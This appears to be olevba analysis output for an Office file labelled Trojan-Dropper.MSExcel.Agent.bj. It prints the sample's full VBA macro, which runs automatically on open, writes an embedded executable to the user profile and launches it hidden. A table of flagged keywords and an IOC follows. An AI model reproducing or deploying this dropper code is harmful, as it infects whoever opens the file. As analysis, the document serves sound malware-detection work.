olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan-Dropper.MSExcel.Agent.bj-cf1107cd821b621f0dd069157c220b68441a2f91
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan-Dropper.MSExcel.Agent.bj-cf1107cd821b621f0dd069157c220b68441a2f91 - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Trojan-Dropper.MSExcel.Agent.bj-cf1107cd821b621f0dd069157c220b68441a2f91 - OLE stream: 'VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Auto_Open()
    Mmnbc12
End Sub
Sub Mmnbc12()
    Dim Mmnbc7 As Integer
    Dim Mmnbc1 As String
    Dim Mmnbc2 As String
    Dim Mmnbc3 As Integer
    Dim Mmnbc4 As Paragraph
    Dim Mmnbc8 As Integer
    Dim Mmnbc9 As Boolean
    Dim Mmnbc5 As Integer
    Dim Mmnbc11 As String
    Dim Mmnbc6 As Byte
    Dim Oyonnvcjok As String
    Oyonnvcjok = "Oyonnvcjok"
    Mmnbc1 = "dKoRUxCQbKlIS.exe"
    Mmnbc2 = Environ("USERPROFILE")
    ChDrive (Mmnbc2)
    ChDir (Mmnbc2)
    Mmnbc3 = FreeFile()
    Open Mmnbc1 For Binary As Mmnbc3
    For Each Mmnbc4 In ActiveDocument.Paragraphs
        DoEvents
            Mmnbc11 = Mmnbc4.Range.Text
        If (Mmnbc9 = True) Then
            Mmnbc8 = 1
            While (Mmnbc8 < Len(Mmnbc11))
                Mmnbc6 = Mid(Mmnbc11, Mmnbc8, 4)
                Put #Mmnbc3, , Mmnbc6
                Mmnbc8 = Mmnbc8 + 4
            Wend
        ElseIf (InStr(1, Mmnbc11, Oyonnvcjok) > 0 And Len(Mmnbc11) > 0) Then
            Mmnbc9 = True
        End If
    Next
    Close #Mmnbc3
    Mmnbc13 (Mmnbc1)
End Sub
Sub Mmnbc13(Mmnbc10 As String)
    Dim Mmnbc7 As Integer
    Dim Mmnbc2 As String
    Mmnbc2 = Environ("USERPROFILE")
    ChDrive (Mmnbc2)
    ChDir (Mmnbc2)
    Mmnbc7 = Shell(Mmnbc10, vbHide)
End Sub
Sub AutoOpen()
    Auto_Open
End Sub
Sub Workbook_Open()
    Auto_Open
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|IOC       |dKoRUxCQbKlIS.exe   |Executable file name                         |
+----------+--------------------+---------------------------------------------+

